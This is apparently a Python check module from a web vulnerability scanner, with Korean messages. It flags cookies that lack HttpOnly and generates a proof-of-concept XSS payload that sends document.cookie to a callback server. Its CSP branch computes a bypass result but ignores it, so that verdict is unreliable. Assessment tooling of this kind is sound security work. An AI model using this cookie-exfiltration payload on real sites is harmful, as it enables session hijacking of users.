from typing import Optional, Dict, List

from data_models import FinalReportData, ExploitScenario, IExploitCheck, CookieInfo

class CookieTheftCheck(IExploitCheck):
    def check(self, data: FinalReportData, callback_server: str) -> Optional[ExploitScenario]:
        all_cookies: List[CookieInfo] = data.defenses.all_cookies
        csp_rules = data.defenses.csp_rules

        if not all_cookies:
            return None

        leakable_cookies = [c.name for c in all_cookies if not c.has_httponly]
        protected_cookies = [c.name for c in all_cookies if c.has_httponly]

        if not leakable_cookies:
            return ExploitScenario(
                scenario_name="쿠키 탈취",
                is_possible=False,
                severity="Info",
                des=f"모든 쿠키({protected_cookies})에 'HttpOnly' 플래그가 설정되어 있습니다."
            )
        ### 여기부터 보면됨
        if csp_rules:
            csp_bypass = self._can_send_data(csp_rules, callback_server)
            self.csp_bypass = csp_bypass
            return ExploitScenario(
                scenario_name="쿠키 탈취",
                is_possible=False,
                severity="Medium",
                des=f"CSP 정책이 설정되어 있어 쿠키 탈취가 차단될 수 있습니다. "
            )
        
        poc_code = f"fetch('{callback_server}/?cookies='%2bdocument.cookie)" 
        return ExploitScenario(
            scenario_name="쿠키 탈취 (세션 하이재킹)",
            is_possible=True,
            severity="Medium",
            des=f"탈취 불가 쿠키: {protected_cookies}.\n 탈취 가능 쿠키: {leakable_cookies}.",
            poc_code=poc_code
        )

    def _can_send_data(self, csp: Dict[str, str], callback_server: str) -> bool:
        """
        [헬퍼] 탈취한 쿠키를 외부 서버로 전송할 수 있는지 CSP 정책을 검사합니다.
        """
        if not csp:
            return True

        allowed_sources = csp.get('img-src', '') + " " + csp.get('connect-src', '')
        
        if "*" in allowed_sources or callback_server in allowed_sources:
            return True
            
        return False

